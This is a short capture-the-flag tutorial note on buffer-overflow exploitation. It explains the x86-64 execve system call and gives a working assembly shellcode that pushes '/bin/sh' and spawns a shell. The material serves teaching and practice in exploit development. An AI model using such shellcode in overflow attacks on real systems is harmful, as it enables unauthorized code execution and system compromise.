# Simple Buffer Overflow - 0x02
###### tags: `CTF` `PWN`

## Why we'd like to create shellcode?
In pwn problem, most of the program don't have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use `bof` to overlap the original address by shellcode address. Then we can take the shell.

## How to create a shellcode in BOF?
In lecture [0x01](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs), we can see sub-function that create a shell using command:
```bash!
execve("/bin/sh", (char *[]){0}, (char *[]){0});
```
According to [Linux System Call Table for x86 64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/), we can see that <font color='FF0000'>`execve`</font> is a system call and the parameter sequence is as the same as [normal calling convention](https://en.wikipedia.org/wiki/X86_calling_conventions).
* Note that in `x86-64` →
    > The kernel interface uses `RDI`, `RSI`, `RDX`, `R10`, `R8` and `R9`. In C++, this is the first parameter. 


| %rax | System Call | %rdi | %rsi | %rdx | %r10 | %r8 | %r9 |
| :--------: | :--------: | :--------: |:-:|:-:|:-:|:-:|:-:|
| 59(0x3B)     | sys_execve     | const char \*filename|const char \*const argv[]|const char \*const envp[]||||

Therefore, `%rdi` store address of `/bin/sh` and `%rsi`, `%rdx` can temporarily set `0`

### Implement
```assembly!
mov    rbx, 0x68732f6e69622f
push   rbx
mov    rdi, rsp
xor    rsi, rsi
xor    rdx, rdx
mov    rax, 0x3b
syscall
```
* We can use [hex2text tool](https://string-functions.com/hex-string.aspx) to parse .`0x68732f6e69622f` and we obtain `?hs/nib/`
* First 3 line, we push `/bin/sh` to stack and `%rsp` is the top of the stack address, so we `%rdi` will obtain `/bin/sh` address from `%rsp`
* Then, let `%rsi` and `%rdx` be `0`
* To set `%rax` to right system call number, that is `0x3b`
* Finally, we did it!!!

![](https://imgur.com/EtW8yZu.png)

## Reference
[NTUSTISC - Pwn Basic 2 [2019.03.19]](https://youtu.be/PBgHHWtjtFA)